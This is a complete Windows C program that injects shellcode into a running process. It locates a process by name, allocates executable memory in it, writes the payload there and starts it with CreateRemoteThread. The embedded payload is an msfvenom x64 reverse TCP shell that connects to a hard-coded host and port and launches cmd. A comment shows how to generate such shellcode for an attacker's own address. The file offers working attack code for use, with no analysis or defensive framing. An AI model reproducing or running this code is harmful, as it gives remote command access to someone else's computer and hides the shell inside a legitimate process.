#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

// Use your shellcode : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your(attacker) IP address> LPORT=<Your(attacker) port number> -f c 
// Example			  : msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=5555 -f c
char shellcode[] ={
                            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                            "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
                            "\x00\x49\x89\xe5\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x01\x0b"
                            "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
                            "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
                            "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
                            "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
                            "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
                            "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
                            "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
                            "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
                            "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
                            "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
                            "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
                            "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
                            "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
                            "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
                            "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
};

// Function to get the PID of a process by its name
DWORD getPid(const wchar_t* process) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD process_id = 0;

    // Take a snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERROR] CreateToolhelp32Snapshot failed [%d]\n", GetLastError());
        return 0;
    }

    // Initialize the PROCESSENTRY32 structure
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process
    if (!Process32FirstW(hSnapshot, &pe32)) {
        wprintf(L"[ERROR] Process32First failed [%d]\n", GetLastError());
        CloseHandle(hSnapshot); // clean the snapshot object
        return 0;
    }

    // Iterate through the snapshot to find the process
    do {
        //wprintf(L"Checking process: %s\n", pe32.szExeFile);
        if (_wcsicmp(pe32.szExeFile, process) == 0) {
            process_id = pe32.th32ProcessID;
            wprintf(L"Found process: %s with PID: %d\n", process, process_id);
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot); // clean the snapshot object
    return process_id;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        fwprintf(stderr, L"Usage: %s <process>\n", argv[0]);
        wprintf(L"\nExample: %s notepad.exe\n", argv[0]);
        return 1;
    }

    // Get the process name from the command line arguments
    const wchar_t* process = argv[1];
    DWORD pid = getPid(process);
    if (pid == 0) {
        wprintf(L"Process %s not found.\n", process);
        return 1;
    }

    wprintf(L"[+] PID: %d\n", pid);

    // Open the target process with necessary permissions
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        wprintf(L"[ERROR] Could not open process [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] Process open successfully!\n");

    // Allocate memory for shellcode
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAddress == NULL) {
        wprintf(L"[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 100;
    }

    printf("[+] Memory allocated Successfully!\n");

    // Write the shellcode into memory
    if (WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), NULL) == 0) {
        wprintf(L"[ERROR] Could not write to remote memory [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 101;
    }

    printf("[+] Shellcode has been writen in the memory successfully!\n");

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        wprintf(L"[ERROR] Could not create new thread [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 102;
    }

    printf("[+] Remote has been created successfully!\n");

    // Wait for the remote thread to complete execution
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}